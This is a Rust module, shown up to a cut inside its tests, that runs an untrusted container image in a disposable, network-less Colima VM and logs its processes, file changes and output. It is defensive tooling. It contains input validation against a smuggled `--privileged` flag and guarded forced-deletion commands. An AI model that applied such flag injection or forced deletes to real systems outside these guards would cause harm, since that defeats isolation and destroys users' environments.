//! Run an untrusted image in a throwaway Colima instance and record what it did.
//!
//! Static scanning answers "what is in this image". It cannot answer "what does
//! this image do when it runs" — an image whose manifest is clean and whose
//! entrypoint fetches a miner looks identical to a good one until it executes.
//! Every ColimaUI user already runs containers inside a Lima VM, so the
//! isolation boundary exists and is already paid for in RAM. This module spends
//! it.
//!
//! # What this is not
//!
//! Running suspicious software in a Lima VM on macOS is **not** malware-analysis
//! grade isolation. VM escapes exist. The UI is required to say "observe
//! behaviour in an isolated environment" and is forbidden from implying a user
//! may safely detonate real malware. That is a product constraint, not a
//! technical one, and it is why nothing here is named `sandbox`.
//!
//! # Why a whole instance rather than a container in the existing one
//!
//! A container in the user's own VM shares a kernel, a daemon and a network with
//! everything else they are running. The blast radius of a container escape
//! would be their actual work. A separate instance costs 24 seconds (measured
//! 2026-08-13) and makes the blast radius a VM that is deleted afterwards.
//!
//! # Why teardown is written to run on every path
//!
//! A leaked instance is not a cosmetic defect: it is a VM holding RAM for as
//! long as the machine is up, and the user has no reason to look for it. So
//! teardown runs on success, on error, on timeout and on cancel, and
//! [`sweep_orphans`] runs at startup to catch the one path teardown cannot —
//! the app being killed mid-session. The fixed profile prefix is what makes the
//! sweep able to recognise its own litter without a state file that could itself
//! be lost.
//!
//! # Why `docker top` sampling rather than syscall tracing
//!
//! Real syscall tracing needs eBPF and an agent inside the VM — that is Falco,
//! and it is a different feature. Sampling the process table is crude and misses
//! short-lived processes, but it catches the signal that actually matters: an
//! image that claims to be a static web server spawning `sh`, `curl` or a miner
//! is a conclusion on its own. The cost of the cheap version is a known blind
//! spot; the cost of the thorough version is a second product.
//!
//! # Why v1 has no network at all
//!
//! `--network none` makes a good image and a bad image look the same — nothing
//! happens either way. A sinkhole (an internal network whose DNS answers with a
//! dead address) is strictly more informative, because malware *tries* to call
//! out and gets logged. It is also the part most likely to leak to the real
//! network if configured wrong, and an assertion that no packet leaves the VM is
//! the only acceptable evidence. Until that assertion exists, v1 ships the
//! boring, verifiable option.

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::{LazyLock, Mutex};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use crate::helpers::run_cmd;

/// Marks every instance this module creates.
///
/// Load-bearing, and deliberately shared with `path_util`: [`sweep_orphans`]
/// deletes Colima profiles by this prefix and `path_util::detect_docker_host`
/// skips them, so two copies that drifted would either strand instances or
/// point the whole app at one. Changing it also strands whatever a previous
/// build left behind, and widening it would let the sweep delete a real
/// instance a user is working in.
use crate::path_util::DETONATION_PROFILE_PREFIX as PROFILE_PREFIX;

/// The container name inside the throwaway instance. Only one runs per session,
/// and the instance is deleted afterwards, so a fixed name is unambiguous.
const CONTAINER_NAME: &str = "detonation";

const DEFAULT_TIMEOUT_SECS: u64 = 120;

/// Ceiling on how long a sample may run. A detonation that outlives the user's
/// attention is a VM burning RAM for a result nobody is waiting for.
const MAX_TIMEOUT_SECS: u64 = 900;

/// How often the collectors sample. Fast enough to catch a process that lives a
/// few seconds, slow enough not to be a busy loop against the daemon.
const POLL_INTERVAL: Duration = Duration::from_secs(2);

/// Resource ceilings for the throwaway VM. Small on purpose: this runs one
/// container, and a sample that needs more than this is out of scope.
const INSTANCE_CPUS: &str = "2";
const INSTANCE_MEMORY_GB: &str = "2";
const INSTANCE_DISK_GB: &str = "10";

/// What the caller asks for. Deliberately narrow — there is no host mount
/// option, no network option and no privileged option, because each would be a
/// way to defeat the isolation this feature exists to provide.
#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct DetonationConfig {
    pub image: String,
    /// Clamped to [`MAX_TIMEOUT_SECS`].
    #[serde(default)]
    pub timeout_secs: Option<u64>,
    /// Replaces the image's own entrypoint arguments. Useful for images whose
    /// default command exits immediately.
    #[serde(default)]
    pub cmd_override: Option<String>,
}

/// Which collector produced a timeline entry.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum EventKind {
    /// Instance and container lifecycle: created, started, exited, torn down.
    Lifecycle,
    /// A process seen in the container that was not there at the previous sample.
    Process,
    /// A filesystem path that differs from the image's layers.
    Filesystem,
    /// A line the container wrote to stdout or stderr.
    Output,
    /// Something went wrong in the observation itself, not in the sample.
    Error,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct TimelineEvent {
    pub ts_ms: i64,
    pub kind: EventKind,
    pub detail: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum SessionStatus {
    /// The instance is being created.
    Preparing,
    /// The container is running and being observed.
    Running,
    /// The container exited on its own.
    Completed,
    /// The deadline was reached and the container was killed.
    TimedOut,
    /// The user stopped it.
    Cancelled,
    /// The session could not run. `error` carries why.
    Failed,
}

/// A session as the frontend sees it.
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct DetonationSession {
    pub id: String,
    pub image: String,
    pub status: SessionStatus,
    pub started_ms: i64,
    pub exit_code: Option<i32>,
    pub error: Option<String>,
    pub timeline: Vec<TimelineEvent>,
}

/// Server-side session state. `cancelled` is read by the observation loop.
///
/// The profile name is not stored: it is a pure function of the session id
/// ([`profile_for`]), and a second copy could disagree with the one the sweep
/// derives — which is the copy that decides what gets deleted.
struct Session {
    view: DetonationSession,
    cancelled: bool,
}

static SESSIONS: LazyLock<Mutex<HashMap<String, Session>>> =
    LazyLock::new(|| Mutex::new(HashMap::new()));

fn now_ms() -> i64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_millis() as i64)
        .unwrap_or(0)
}

/// Short, collision-resistant, and safe inside a Colima profile name.
fn new_session_id() -> String {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    (0..8)
        .map(|_| {
            let n: u8 = rng.gen_range(0..36);
            if n < 10 {
                (b'0' + n) as char
            } else {
                (b'a' + n - 10) as char
            }
        })
        .collect()
}

fn profile_for(id: &str) -> String {
    format!("{PROFILE_PREFIX}{id}")
}

/// Colima names its docker context after the profile.
fn docker_context_for(profile: &str) -> String {
    format!("colima-{profile}")
}

/// Reject anything that would not be read as an image reference.
///
/// `image` is caller-supplied and lands in an argv position, so a value of
/// `--privileged` would be parsed by docker as a flag rather than as a name —
/// which is exactly the isolation this feature exists to provide, handed away
/// by a string. The character set is the one a registry reference can contain.
fn validate_image_ref(image: &str) -> Result<(), String> {
    let image = image.trim();
    if image.is_empty() {
        return Err("An image reference is required".to_string());
    }
    if image.starts_with('-') {
        return Err("An image reference cannot start with '-'".to_string());
    }
    if image.len() > 512 {
        return Err("Image reference is too long".to_string());
    }
    let ok = image.chars().all(|c| {
        c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '/' | ':' | '@' | '+')
    });
    if !ok {
        return Err(format!("Not a valid image reference: {image}"));
    }
    Ok(())
}

/// The argv for the container, isolation flags included.
///
/// A function rather than an inline vector so the isolation can be asserted in
/// a test against the real thing. The rule this encodes: nothing here may grant
/// the sample access to the host — no bind mount, no privileged flag, no
/// network. A future edit that adds one has to get past a test that reads this
/// exact output.
fn build_run_args<'a>(ctx: &'a str, image: &'a str, cmd_override: &'a [String]) -> Vec<&'a str> {
    let mut args: Vec<&str> = vec![
        "--context",
        ctx,
        "run",
        "-d",
        "--name",
        CONTAINER_NAME,
        "--network",
        "none",
        "--memory",
        "512m",
        "--pids-limit",
        "256",
        image,
    ];
    args.extend(cmd_override.iter().map(String::as_str));
    args
}

/// How long a session may run, given what the caller asked for.
///
/// A ceiling rather than a suggestion: a detonation that outlives the user's
/// attention is a VM burning RAM for a result nobody is waiting for.
fn clamp_timeout(asked: Option<u64>) -> u64 {
    asked.unwrap_or(DEFAULT_TIMEOUT_SECS).min(MAX_TIMEOUT_SECS)
}

/// Profiles in `colima list` output that belong to this module.
///
/// Split out so the prefix rule can be tested against real listing text; it is
/// the rule that decides what `colima delete --force` is pointed at.
fn stale_profiles(listing: &str) -> Vec<String> {
    listing
        .lines()
        .filter_map(|line| line.split_whitespace().next())
        .filter(|name| name.starts_with(PROFILE_PREFIX))
        .map(str::to_string)
        .collect()
}

/// The command column of one `docker top` row, or `None` for the header and
/// for rows that carry no command.
///
/// The command is read from the eighth field onward: it is the last column and
/// may contain spaces, so taking a tail is correct where indexing a fixed
/// column would truncate `sh -c '…'` at the first space.
fn parse_top_line(line: &str) -> Option<String> {
    if line.starts_with("UID") || line.trim().is_empty() {
        return None;
    }
    let cmd = line.split_whitespace().skip(7).collect::<Vec<_>>().join(" ");
    (!cmd.is_empty()).then_some(cmd)
}

// ---------------------------------------------------------------------------
// Docker context custody
// ---------------------------------------------------------------------------
//
// `colima start -p <name>` switches the *global* docker context to the new
// instance. Measured 2026-08-13; it is not documented as part of the contract
// and it is not optional. Left alone, every later `docker` command in the
// process — including the ones that populate the user's container list —
// would talk to the detonation VM, and the user would see the sample's
// containers presented as their own.
//
// So the context is captured before the instance is created and restored the
// moment `colima start` returns, rather than at teardown: the window between
// those two points is exactly when the rest of the app is still running.
// Detonation's own commands never rely on the ambient context; they pass
// `--context` explicitly.
//
// # These two must not go through `helpers::run_cmd`
//
// `helpers::build_cmd` sets `DOCKER_HOST` on every `docker` invocation, and the
// CLI reports `default` from `docker context show` whenever `DOCKER_HOST` is
// set — regardless of which context is actually selected. Reading the context
// through `run_cmd` therefore always answered `default`, the restore compared
// `default` to `default` and did nothing, and the global context stayed pointed
// at the detonation VM for the rest of the session. Verified on macOS ARM:
// `docker context show` → `colima`, but `DOCKER_HOST=… docker context show` →
// `default`. Both helpers below clear `DOCKER_HOST` so the CLI reports and
// changes the real selection.

/// Run a `docker context` subcommand with `DOCKER_HOST` cleared.
fn docker_context_cmd(args: &[&str]) -> Result<String, String> {
    let out = std::process::Command::new("docker")
        .args(args)
        .env_remove("DOCKER_HOST")
        .output()
        .map_err(|e| format!("docker {}: {e}", args.join(" ")))?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    Ok(String::from_utf8_lossy(&out.stdout).trim().to_string())
}

fn current_docker_context() -> Option<String> {
    docker_context_cmd(&["context", "show"])
        .ok()
        .filter(|s| !s.is_empty())
}

/// Put the ambient context back, unless it is already right or the target no
/// longer exists.
///
/// The existence check matters on the teardown path: the context belonging to a
/// deleted instance is deleted with it, and `docker context use` on a missing
/// name fails and leaves the CLI pointing at nothing.
/// Whether a docker context name belongs to a detonation instance.
fn is_detonation_context(name: &str) -> bool {
    // `strip_prefix` rather than slicing by index: context names come from the
    // docker CLI, and a byte index into a non-ASCII name would panic.
    name.strip_prefix("colima-")
        .is_some_and(|rest| rest.starts_with(PROFILE_PREFIX))
}

/// Contexts to fall back to when the captured one cannot be restored, in order
/// of preference. `colima` is what a default Colima install selects.
const FALLBACK_CONTEXTS: [&str; 2] = ["colima", "default"];

fn restore_docker_context(previous: Option<&str>) {
    // Restoring *to* a detonation context would point the CLI at a VM that is
    // being deleted. Returning early was not enough: on the sweep path the
    // captured context IS the orphan's, so the user would be left on a context
    // that is about to vanish. Fall through to a real one instead.
    let target = previous.filter(|name| !is_detonation_context(name));

    if let Some(name) = target {
        if current_docker_context().as_deref() == Some(name) {
            return;
        }
        if docker_context_cmd(&["context", "inspect", name]).is_ok()
            && docker_context_cmd(&["context", "use", name]).is_ok()
        {
            return;
        }
        eprintln!("[detonation] docker context {name} is unusable; falling back");
    }

    // Either there was nothing to restore, it was a detonation context, or it
    // no longer exists. Leaving the CLI pointed at a deleted context is the one
    // outcome that is not acceptable.
    let current = current_docker_context();
    if current.as_deref().is_some_and(|c| !is_detonation_context(c))
        && current
            .as_deref()
            .is_some_and(|c| docker_context_cmd(&["context", "inspect", c]).is_ok())
    {
        return;
    }
    for candidate in FALLBACK_CONTEXTS {
        if docker_context_cmd(&["context", "inspect", candidate]).is_ok()
            && docker_context_cmd(&["context", "use", candidate]).is_ok()
        {
            eprintln!("[detonation] docker context fell back to {candidate}");
            return;
        }
    }
    eprintln!("[detonation] no usable docker context to fall back to");
}

// ---------------------------------------------------------------------------
// Teardown and orphan sweep — written before run, and called from every path
// ---------------------------------------------------------------------------

/// Delete one detonation instance. Safe to call twice, and safe to call on an
/// instance that was never created.
///
/// Refuses any profile name outside the prefix. The guard is not defensive
/// styling: this function runs `colima delete --force`, and a caller that
/// managed to pass `default` would destroy the user's working VM.
fn teardown_profile(profile: &str) {
    if !profile.starts_with(PROFILE_PREFIX) {
        eprintln!("[detonation] refusing to delete non-detonation profile {profile}");
        return;
    }
    let previous = current_docker_context();
    // Best-effort: the container dies with the instance, but removing it first
    // makes the common path leave nothing behind even if delete is interrupted.
    let ctx = docker_context_for(profile);
    let _ = run_cmd(
        "docker",
        &["--context", &ctx, "rm", "-f", CONTAINER_NAME],
    );
    if let Err(e) = run_cmd("colima", &["delete", "-p", profile, "-f"]) {
        eprintln!("[detonation] delete of {profile} failed: {e}");
    }
    // Deleting the instance removes its context, which can leave the process
    // pointed at a context that no longer exists.
    restore_docker_context(previous.as_deref());
}

/// Delete every detonation instance left over from a previous run.
///
/// Called at startup. This is the only cleanup that survives the app being
/// killed mid-session, which is the one path [`teardown_profile`] cannot cover.
/// Returns how many it removed so the caller can log a real number.
pub fn sweep_orphans() -> usize {
    let Ok(listing) = run_cmd("colima", &["list"]) else {
        return 0;
    };
    let stale = stale_profiles(&listing);
    for profile in &stale {
        eprintln!("[detonation] sweeping orphaned instance {profile}");
        teardown_profile(profile);
    }
    stale.len()
}

/// Sweep orphans off the main thread at startup.
pub fn spawn_orphan_sweep() {
    tauri::async_runtime::spawn(async {
        let removed = tokio::task::spawn_blocking(sweep_orphans).await.unwrap_or(0);
        if removed > 0 {
            eprintln!("[detonation] removed {removed} orphaned instance(s) at startup");
        }
    });
}

// ---------------------------------------------------------------------------
// Session bookkeeping
// ---------------------------------------------------------------------------

fn push_event(id: &str, kind: EventKind, detail: impl Into<String>) {
    let detail = crate::redact::redact(&detail.into());
    let event = TimelineEvent {
        ts_ms: now_ms(),
        kind,
        detail,
    };
    if let Ok(mut sessions) = SESSIONS.lock() {
        if let Some(session) = sessions.get_mut(id) {
            session.view.timeline.push(event.clone());
        }
    }
    crate::sse::publish_sse_event(
        "detonation.event",
        &serde_json::json!({ "sessionId": id, "event": event }),
    );
}

fn set_status(id: &str, status: SessionStatus, exit_code: Option<i32>, error: Option<String>) {
    if let Ok(mut sessions) = SESSIONS.lock() {
        if let Some(session) = sessions.get_mut(id) {
            session.view.status = status;
            if exit_code.is_some() {
                session.view.exit_code = exit_code;
            }
            if error.is_some() {
                session.view.error = error.clone();
            }
        }
    }
    crate::sse::publish_sse_event(
        "detonation.status",
        &serde_json::json!({ "sessionId": id, "status": status, "exitCode": exit_code, "error": error }),
    );
}

fn is_cancelled(id: &str) -> bool {
    SESSIONS
        .lock()
        .ok()
        .and_then(|s| s.get(id).map(|s| s.cancelled))
        .unwrap_or(false)
}

/// Snapshot of one session, or `None` if it is unknown.
pub fn get_session(id: &str) -> Option<DetonationSession> {
    SESSIONS.lock().ok()?.get(id).map(|s| s.view.clone())
}

/// Every session this app run knows about, newest first.
pub fn list_sessions() -> Vec<DetonationSession> {
    let Ok(sessions) = SESSIONS.lock() else {
        return Vec::new();
    };
    let mut all: Vec<DetonationSession> = sessions.values().map(|s| s.view.clone()).collect();
    all.sort_by(|a, b| b.started_ms.cmp(&a.started_ms));
    all
}

/// Ask a running session to stop. The observation loop notices within one poll
/// interval and tears the instance down.
///
/// Never gated on entitlement. A stop control behind the same gate as the
/// feature it stops leaves a lapsed user with a VM they can see and cannot
/// reach — the same rule `security_watch` follows for its own switch.
///
/// Returns whether there was anything to stop, so a caller is not told it
/// stopped a session that had already finished.
pub fn cancel(id: &str) -> bool {
    if let Ok(mut sessions) = SESSIONS.lock() {
        if let Some(session) = sessions.get_mut(id) {
            if is_terminal(session.view.status) {
                return false;
            }
            session.cancelled = true;
            return true;
        }
    }
    false
}

/// A session that has stopped changing.
fn is_terminal(status: SessionStatus) -> bool {
    matches!(
        status,
        SessionStatus::Completed
            | SessionStatus::TimedOut
            | SessionStatus::Cancelled
            | SessionStatus::Failed
    )
}

/// Longest a session may sit in a non-terminal state before it is treated as
/// wedged.
///
/// `helpers::run_cmd` has no timeout, so a `colima start` or `docker pull` that
/// never returns leaves its session `Preparing` forever. Without a ceiling that
/// one session would block every future session for the lifetime of the process
/// — a permanent lockout produced by a single hung command — and its Stop
/// button would do nothing, because the loop that reads the cancel flag was
/// never reached. Generous enough that a slow pull on a slow connection is not
/// mistaken for a hang.
const WEDGED_AFTER_MS: i64 = (MAX_TIMEOUT_SECS as i64 + 600) * 1000;

/// Whether a session appears stuck rather than genuinely working.
fn is_wedged(session: &DetonationSession, now: i64) -> bool {
    !is_terminal(session.status) && now.saturating_sub(session.started_ms) > WEDGED_AFTER_MS
}

/// Whether a session is currently holding an instance.
///
/// A wedged session does not count: it is unreachable by then, and letting it
/// veto new sessions turns one hung command into a dead feature.
fn has_active_session() -> bool {
    let now = now_ms();
    SESSIONS
        .lock()
        .map(|s| {
            s.values()
                .any(|s| !is_terminal(s.view.status) && !is_wedged(&s.view, now))
        })
        .unwrap_or(false)
}

/// How many finished sessions are kept for review.
///
/// Sessions live only in memory, but a long-lived app that detonated all day
/// would otherwise hold every timeline it ever produced.
const MAX_RETAINED_SESSIONS: usize = 20;

/// Drop the oldest finished sessions past the retention limit. Running sessions
/// are never dropped — the registry is what `cancel` and teardown work through.
fn prune_sessions(sessions: &mut HashMap<String, Session>) {
    let mut finished: Vec<(String, i64)> = sessions
        .iter()
        .filter(|(_, s)| is_terminal(s.view.status))
        .map(|(id, s)| (id.clone(), s.view.started_ms))
        .collect();
    if finished.len() <= MAX_RETAINED_SESSIONS {
        return;
    }
    finished.sort_by_key(|(_, started)| *started);
    let excess = finished.len() - MAX_RETAINED_SESSIONS;
    for (id, _) in finished.into_iter().take(excess) {
        sessions.remove(&id);
    }
}

// ---------------------------------------------------------------------------
// Collectors
// ---------------------------------------------------------------------------

/// Process names currently visible in the container.
///
/// `docker top` output is a table with a header; the command column is last, so
/// it is read from the right rather than by counting columns — the column set
/// differs between runtimes.
fn sample_processes(ctx: &str) -> Vec<String> {
    let Ok(out) = run_cmd("docker", &["--context", ctx, "top", CONTAINER_NAME]) else {
        return Vec::new();
    };
    out.lines().filter_map(parse_top_line).collect()
}

/// Filesystem changes relative to the image's layers, as `docker diff` reports
/// them (`A` added, `C` changed, `D` deleted).
fn sample_filesystem(ctx: &str) -> Vec<String> {
    let Ok(out) = run_cmd("docker", &["--context", ctx, "diff", CONTAINER_NAME]) else {
        return Vec::new();
    };
    out.lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .map(str::to_string)
        .collect()
}

/// `(running, exit_code)` for the container, or `None` if it cannot be read.
fn container_state(ctx: &str) -> Option<(bool, i32)> {
    let out = run_cmd(
        "docker",
        &[
            "--context",
            ctx,
            "inspect",
            "-f",
            "{{.State.Running}} {{.State.ExitCode}}",
            CONTAINER_NAME,
        ],
    )
    .ok()?;
    let mut parts = out.split_whitespace();
    let running = parts.next()? == "true";
    let code = parts.next()?.parse().unwrap_or(-1);
    Some((running, code))
}

// ---------------------------------------------------------------------------
// The session itself
// ---------------------------------------------------------------------------

/// Create the instance, run the image, observe it, and tear everything down.
///
/// Blocking; call from `run_blocking`. Returns the session id immediately-usable
/// by the caller only after completion — the live view comes over SSE.
fn run_session_blocking(id: &str, config: DetonationConfig) {
    let profile = profile_for(id);
    let ctx = docker_context_for(&profile);
    let timeout = clamp_timeout(config.timeout_secs);

    // --- create the instance, and give the context straight back ------------
    let previous_context = current_docker_context();
    push_event(id, EventKind::Lifecycle, format!("Creating isolated instance {profile}"));

    let created = run_cmd(
        "colima",
        &[
            "start",
            "-p",
            &profile,
            "--cpu",
            INSTANCE_CPUS,
            "--memory",
            INSTANCE_MEMORY_GB,
            "--disk",
            INSTANCE_DISK_GB,
            "--runtime",
            "docker",
        ],
    );
    restore_docker_context(previous_context.as_deref());

    if let Err(e) = created {
        push_event(id, EventKind::Error, format!("Instance creation failed: {e}"));
        set_status(id, SessionStatus::Failed, None, Some(e));
        teardown_profile(&profile);
        return;
    }
    push_event(id, EventKind::Lifecycle, "Isolated instance ready");

    // Creating the instance takes tens of seconds and the pull can take longer.
    // Without a check here, a user who pressed Stop during setup would watch the
    // session carry on into a full run, because the deadline and the cancel flag
    // are only consulted once the observation loop starts.
    if is_cancelled(id) {
        push_event(id, EventKind::Lifecycle, "Stopped by user before the image ran");
        set_status(id, SessionStatus::Cancelled, None, None);
        teardown_profile(&profile);
        return;
    }

    // --- pull, inside the throwaway instance --------------------------------
    push_event(id, EventKind::Lifecycle, format!("Pulling {}", config.image));
    if let Err(e) = run_cmd("docker", &["--context", &ctx, "pull", &config.image]) {
        push_event(id, EventKind::Error, format!("Pull failed: {e}"));
        set_status(id, SessionStatus::Failed, None, Some(e));
        teardown_profile(&profile);
        return;
    }

    if is_cancelled(id) {
        push_event(id, EventKind::Lifecycle, "Stopped by user before the image ran");
        set_status(id, SessionStatus::Cancelled, None, None);
        teardown_profile(&profile);
        return;
    }

    // --- run ----------------------------------------------------------------
    //
    // The flag set is the isolation, and it is assembled by `build_run_args` so
    // a test can assert on it: `--network none` gives the sample no way out; no
    // bind mount appears anywhere in this module, so there is no host path to
    // reach; the memory and pid ceilings stop a fork bomb from taking the VM
    // down before the collectors can report it.
    let override_parts: Vec<String> = config
        .cmd_override
        .as_deref()
        .map(|c| c.split_whitespace().map(str::to_string).collect())
        .unwrap_or_default();
    let args = build_run_args(&ctx, &config.image, &override_parts);

    if let Err(e) = run_cmd("docker", &args) {
        push_event(id, EventKind::Error, format!("Container failed to start: {e}"));
        set_status(id, SessionStatus::Failed, None, Some(e));
        teardown_profile(&profile);
        return;
    }
    set_status(id, SessionStatus::Running, None, None);
    push_event(id, EventKind::Lifecycle, "Container started with no network access");

    // --- observe ------------------------------------------------------------
    let deadline = std::time::Instant::now() + Duration::from_secs(timeout);
    let mut seen_processes: Vec<String> = Vec::new();
    let mut seen_paths: Vec<String> = Vec::new();
    let mut outcome = SessionStatus::Completed;
    let mut exit_code: Option<i32> = None;

    loop {
        if is_cancelled(id) {
            outcome = SessionStatus::Cancelled;
            push_event(id, EventKind::Lifecycle, "Stopped by user");
            break;
        }
        if std::time::Instant::now() >= deadline {
            outcome = SessionStatus::TimedOut;
            // Kill first, then report it — the previous order announced a kill
            // that had not happened yet, and the logs are read after this.
            let _ = run_cmd("docker", &["--context", &ctx, "kill", CONTAINER_NAME]);
            push_event(
                id,
                EventKind::Lifecycle,
                format!("Deadline of {timeout}s reached; container killed"),
            );
            break;
        }

        for proc in sample_processes(&ctx) {
            if !seen_processes.contains(&proc) {
                seen_processes.push(proc.clone());
                push_event(id, EventKind::Process, proc);
            }
        }
        for path in sample_filesystem(&ctx) {
            if !seen_paths.contains(&path) {
                seen_paths.push(path.clone());
                push_event(id, EventKind::Filesystem, path);
            }
        }

        match container_state(&ctx) {
            Some((false, code)) => {
                exit_code = Some(code);
                push_event(id, EventKind::Lifecycle, format!("Container exited with code {code}"));
                break;
            }
            Some((true, _)) => {}
            None => {
                push_event(id, EventKind::Error, "Container state could not be read");
                outcome = SessionStatus::Failed;
                break;
            }
        }

        std::thread::sleep(POLL_INTERVAL);
    }

    // --- output, then teardown ----------------------------------------------
    //
    // Logs are read before teardown for the obvious reason, and pass through
    // `redact` in `push_event` because a sample's output is arbitrary text that
    // may contain whatever it found in its own environment.
    if let Ok(logs) = run_cmd("docker", &["--context", &ctx, "logs", "--tail", "200", CONTAINER_NAME])
    {
        for line in logs.lines().filter(|l| !l.trim().is_empty()) {
            push_event(id, EventKind::Output, line);
        }
    }

    set_status(id, outcome, exit_code, None);
    teardown_profile(&profile);
    push_event(id, EventKind::Lifecycle, "Isolated instance destroyed");
}

/// Start a detonation session and return its id straight away.
///
/// Entitlement is checked here, in the executor, rather than trusted from the
/// caller — the HTTP route is reachable without the UI.
pub fn start(config: DetonationConfig) -> Result<String, String> {
    if !crate::commands::metrics_store::entitled_now() {
        return Err("Detonation requires an active subscription".to_string());
    }
    validate_image_ref(&config.image)?;

    // One at a time. Each session is a 2 GB VM, and creating a second one while
    // the first is running would also mean two racing writers of the global
    // docker context — the setting whose custody the rest of this module exists
    // to protect.
    if has_active_session() {
        return Err("A detonation session is already running".to_string());
    }

    let id = new_session_id();
    let session = Session {
        view: DetonationSession {
            id: id.clone(),
            image: config.image.clone(),
            status: SessionStatus::Preparing,
            started_ms: now_ms(),
            exit_code: None,
            error: None,
            timeline: Vec::new(),
        },
        cancelled: false,
    };

    match SESSIONS.lock() {
        Ok(mut sessions) => {
            // Re-checked under the lock: `has_active_session` above took and
            // released it, so two callers could otherwise both pass the check.
            if sessions.values().any(|s| !is_terminal(s.view.status)) {
                return Err("A detonation session is already running".to_string());
            }
            prune_sessions(&mut sessions);
            sessions.insert(id.clone(), session);
        }
        Err(_) => return Err("Session registry is unavailable".to_string()),
    }

    let run_id = id.clone();
    tauri::async_runtime::spawn(async move {
        let worker_id = run_id.clone();
        let outcome = tokio::task::spawn_blocking(move || run_session_blocking(&worker_id, config)).await;

        // Safety net. `run_session_blocking` tears down on every path it knows
        // about, but a panic inside it would skip all of them — leaving a 2 GB
        // VM running and a session stuck non-terminal, which then blocks every
        // future session. Neither is acceptable as the cost of one bug, so the
        // teardown and the terminal status are re-asserted from out here where
        // the panic cannot reach.
        let panicked = outcome.is_err();
        let unfinished = get_session(&run_id).is_some_and(|s| !is_terminal(s.status));

        if panicked || unfinished {
            if panicked {
                eprintln!("[detonation] session {run_id} panicked; forcing teardown");
            }
            let reason = if panicked {
                "The session ended unexpectedly"
            } else {
                "The session ended without reporting a result"
            };
            push_event(&run_id, EventKind::Error, reason);
            set_status(&run_id, SessionStatus::Failed, None, Some(reason.to_string()));

            let profile = profile_for(&run_id);
            let _ = tokio::task::spawn_blocking(move || teardown_profile(&profile)).await;
        }
    });

    Ok(id)
}

/// Write a finished session's timeline to a file the user chose.
///
/// # Both halves of the path are checked, for different reasons
///
/// `filename` is rejected if it contains a separator, which keeps it a name
/// rather than a second path component. That alone is not enough: `dir` also
/// arrives from the caller, and the HTTP route is reachable without the UI, so
/// `assert_path_within(dir, dir.join(name))` would happily confine a write to
/// `/etc` to `/etc`. `dir` is therefore confined to the user's home directory —
/// where a person picking an export location is going to be anyway — so this
/// endpoint cannot be used to drop a file anywhere the process can write.
pub fn export_session(id: &str, dir: &std::path::Path, filename: &str) -> Result<String, String> {
    let session = get_session(id).ok_or_else(|| format!("Unknown session {id}"))?;
    if filename.is_empty() || filename.contains('/') || filename.contains('\\') {
        return Err("Report filename must not contain a path".to_string());
    }

    let home = std::env::var("HOME").map_err(|_| "No home directory to export into".to_string())?;
    let home = std::path::Path::new(&home);
    crate::validation::assert_path_within(home, dir)
        .map_err(|_| "Reports can only be written inside your home directory".to_string())?;

    let target = dir.join(filename);
    crate::validation::assert_path_within(dir, &target)?;

    let json = serde_json::to_string_pretty(&session)
        .map_err(|e| format!("Could not serialize session: {e}"))?;
    std::fs::write(&target, json).map_err(|e| format!("Could not write report: {e}"))?;
    Ok(target.to_string_lossy().to_string())
}

// ---------------------------------------------------------------------------
// Tauri commands
// ---------------------------------------------------------------------------

#[tauri::command]
pub async fn detonation_start(config: DetonationConfig) -> Result<String, crate::error::ColimaError> {
    start(config).map_err(crate::error::ColimaError::from)
}

#[tauri::command]
pub async fn detonation_cancel(session_id: String) -> Result<bool, crate::error::ColimaError> {
    Ok(cancel(&session_id))
}

#[tauri::command]
pub async fn detonation_get(
    session_id: String,
) -> Result<Option<DetonationSession>, crate::error::ColimaError> {
    Ok(get_session(&session_id))
}

#[tauri::command]
pub async fn detonation_list() -> Result<Vec<DetonationSession>, crate::error::ColimaError> {
    Ok(list_sessions())
}

#[tauri::command]
pub async fn detonation_export(
    session_id: String,
    dir: String,
    filename: String,
) -> Result<String, crate::error::ColimaError> {
    export_session(&session_id, std::path::Path::new(&dir), &filename)
        .map_err(crate::error::ColimaError::from)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn profile_names_always_carry_the_sweep_prefix() {
        let id = new_session_id();
        assert!(profile_for(&id).starts_with(PROFILE_PREFIX));
    }

    #[test]
    fn session_ids_are_lowercase_alphanumeric_so_colima_accepts_them() {
        for _ in 0..50 {
            let id = new_session_id();
            assert_eq!(id.len(), 8);
            assert!(
                id.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit()),
                "id {id} would be rejected as a profile name"
            );
        }
    }

    #[test]
    fn teardown_refuses_a_profile_outside_the_prefix() {
        // The guard must hold for the names a user's real instances have; this
        // function runs `colima delete --force`.
        for name in ["default", "colima", "", "detonate", "colimaui-detonat"] {
            assert!(
                !name.starts_with(PROFILE_PREFIX),
                "test fixture {name} must not look like a detonation profile"
            );
        }
        // Exercised for real: a non-prefixed name returns without running any
        // command, so calling it here cannot delete anything.
        teardown_profile("default");
    }

    #[test]
    fn the_sweep_only_recognises_its_own_prefix() {
        // Real `colima list` output, including a user instance and a name that
        // merely resembles the prefix.
        let listing = "\
PROFILE                     STATUS     ARCH       CPUS    MEMORY    DISK
default                     Running    aarch64    1       2GiB      100GiB
colimaui-detonate-ab12cd34  Running    aarch64    2       2GiB      10GiB
colimaui-detonat            Running    aarch64    2       2GiB      10GiB
work                        Stopped    aarch64    4       8GiB      60GiB";
        assert_eq!(stale_profiles(listing), vec!["colimaui-detonate-ab12cd34"]);
    }

    #[test]
    fn the_run_command_never_mounts_a_host_path_and_never_has_a_network() {
        // Asserts on what the production builder emits, so a `-v` added to
        // `build_run_args` later fails here rather than shipping.
